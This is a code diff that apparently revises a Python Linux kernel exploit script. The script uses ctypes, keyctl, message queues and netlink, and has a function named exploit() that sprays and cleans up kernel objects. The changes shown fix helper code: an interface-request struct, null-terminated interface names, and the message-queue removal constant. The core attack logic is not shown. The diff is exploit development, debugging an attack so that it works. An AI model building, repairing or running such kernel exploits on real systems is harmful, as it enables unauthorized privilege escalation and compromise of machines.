@@ -20,11 +20,10 @@ import struct
 import socket
 import fcntl
 import subprocess
-import select
 from ctypes import (
     CDLL, c_void_p, c_int, c_uint, c_long, c_ulong, c_char_p,
     c_size_t, c_ssize_t, POINTER, Structure, Union, create_string_buffer,
-    addressof, sizeof
+    addressof, sizeof, c_char, c_ubyte, c_ushort, c_short
 )
 
 # ============================================================================
@@ -73,6 +72,7 @@ KEYCTL_READ = 11
 # Message queue constants
 IPC_CREAT = 0o1000
 IPC_PRIVATE = 0
+IPC_RMID = 0
 
 # Netlink constants
 NETLINK_ROUTE = 0
@@ -113,9 +113,16 @@ class Iovec(Structure):
 class Ifreq(Structure):
     _fields_ = [
         ("ifr_name", c_char * 16),
-        ("ifr_index", c_int),
-        ("pad", c_char * 20),
+        ("ifr_ifru", c_ubyte * 24),  # Union field
     ]
+    
+    @property
+    def ifr_index(self):
+        return struct.unpack("i", bytes(self.ifr_ifru[:4]))[0]
+    
+    @ifr_index.setter
+    def ifr_index(self, value):
+        self.ifr_ifru[:4] = struct.pack("i", value)
 
 class Msgbuf(Structure):
     _fields_ = [
@@ -181,7 +188,7 @@ def get_iface_index(iface_name):
     """Get network interface index."""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     ifreq = Ifreq()
-    ifreq.ifr_name = iface_name.encode()
+    ifreq.ifr_name = iface_name.encode()[:15] + b'\x00'
     try:
         fcntl.ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
         return ifreq.ifr_index
@@ -673,7 +680,7 @@ def exploit():
     
     # Cleanup
     for mq in msg_queues:
-        libc.msgctl(mq, 0, 0)  # IPC_RMID = 0
+        libc.msgctl(mq, IPC_RMID, 0)
     for s in socks:
         s.close()
     for k in keys:
